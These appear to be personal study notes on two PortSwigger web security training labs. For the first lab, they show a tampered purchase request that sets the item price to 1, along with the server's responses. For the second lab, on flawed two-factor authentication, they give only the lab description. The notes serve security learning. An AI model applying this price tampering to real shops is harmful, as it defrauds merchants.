# 1. Lab: [Excessive trust in client-side controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)

This lab doesn't adequately **validate user input**. You can exploit a logic flaw in its **purchasing workflow** to _buy items for an unintended price_. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter

find:

```js
change and send:
productId=1&redir=PRODUCT&quantity=1&price=1
```

response:

```js
HTTP/2 302 Found
Location: /product?productId=1
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

go to => Follow direction in Burp

response:

```js
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 8292
```

# 2. [Lab: 2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)

This lab's _two-factor authentication_ is vulnerable due to its flawed logic. To solve the lab, access **Carlos's account page**.

Your credentials: wiener:peter
Victim's username: carlos
You also have **access to the email server to receive your 2FA** verification code
